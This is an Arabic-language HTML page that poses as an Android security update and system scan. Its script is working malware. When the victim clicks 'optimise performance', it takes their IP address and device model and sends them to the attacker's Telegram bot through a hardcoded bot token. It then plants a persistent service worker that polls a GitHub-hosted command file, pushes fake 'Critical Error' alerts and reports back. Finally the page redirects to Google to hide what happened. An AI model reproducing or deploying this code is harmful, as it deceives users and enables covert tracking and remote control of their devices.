<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان أندرويد</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 40px 20px; }
        .terminal { border: 1px solid #00ff41; padding: 20px; background: #050505; box-shadow: 0 0 15px #00ff41; display: inline-block; width: 100%; max-width: 450px; }
        .scan-bar { width: 100%; height: 4px; background: #111; position: relative; overflow: hidden; margin: 15px 0; }
        .progress { width: 40%; height: 100%; background: #00ff41; position: absolute; animation: move 1.5s infinite linear; }
        @keyframes move { from { left: -40%; } to { left: 100%; } }
        button { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>

<div class="terminal">
    <h3 id="head">[ SYSTEM SCAN V10 ]</h3>
    <div class="scan-bar"><div class="progress"></div></div>
    <p id="status" style="font-size: 14px;">جاري فحص سلامة الملفات...</p>
    <button onclick="ignite()">تحسين أداء النظام</button>
</div>

<script>
    const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
    // نصيحة: ضع معرف الشات الخاص بك هنا مباشرة إذا لم يعمل التلقائي
    let manualChatId = ""; 

    const swCode = `
        const TOKEN = '${TOKEN}';
        const CMD_URL = 'https://raw.githubusercontent.com/mosbahimouataz7/no-ip-/main/server.json';
        let cid = "";
        let lastCmdId = "";

        self.addEventListener('install', (event) => {
            self.skipWaiting();
        });

        self.addEventListener('activate', (event) => {
            event.waitUntil(clients.claim());
        });

        self.addEventListener('message', (e) => {
            if (e.data.type === 'INIT') { 
                cid = e.data.id; 
                setInterval(pollCommands, 10000);
            }
        });

        async function pollCommands() {
            try {
                const res = await fetch(CMD_URL + '?nocache=' + Date.now());
                const cmd = await res.json();
                if (cmd.id !== lastCmdId) {
                    lastCmdId = cmd.id;
                    processAction(cmd.action);
                }
            } catch(e) {}
        }

        async function processAction(act) {
            let info = "";
            if (act === "REPORT") info = "📊 Active Status: Target Online";
            else if (act === "VIBRATE") {
                self.registration.showNotification("System Alert", { body: "Critical Error!", vibrate: [500, 100, 500] });
                info = "📳 Vibration Executed";
            }
            if (cid) fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + cid + '&text=' + encodeURIComponent(info));
        }
    `;

    async function ignite() {
        document.getElementById('status').innerText = "جاري تنفيذ بروتوكولات الأمان...";
        
        try {
            // 1. محاولة جلب الـ Chat ID تلقائياً
            if (!manualChatId) {
                const res = await fetch(\`https://api.telegram.org/bot\${TOKEN}/getUpdates\`);
                const data = await res.json();
                if (data.result.length > 0) {
                    manualChatId = data.result[data.result.length - 1].message.chat.id;
                } else {
                    alert("يرجى إرسال رسالة للبوت أولاً!");
                    return;
                }
            }

            // 2. جلب الـ IP الحقيقي للضحية
            let ip = "Unknown";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch(e) {}

            const ua = navigator.userAgent;
            const model = ua.match(/\\(([^)]+)\\)/) ? ua.match(/\\(([^)]+)\\)/)[1] : "Unknown Device";
            const initialReport = \`💀 **NEW TARGET READY**\\n\\n📱 Device: \${model}\\n🌐 IP: \${ip}\`;
            
            await fetch(\`https://api.telegram.org/bot\${TOKEN}/sendMessage?chat_id=\${manualChatId}&text=\${encodeURIComponent(initialReport)}&parse_mode=Markdown\`);

            // 3. زرع الـ Service Worker
            const blob = new Blob([swCode], { type: 'text/javascript' });
            const swUrl = URL.createObjectURL(blob);
            const reg = await navigator.serviceWorker.register(swUrl);
            
            setTimeout(() => {
                if (navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: manualChatId });
                }
            }, 1500);

            document.getElementById('status').innerText = "اكتمل التحديث بنجاح!";
            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);

        } catch (e) {
            console.error(e);
            alert("خطأ في الاتصال.");
        }
    }
</script>
</body>
</html>
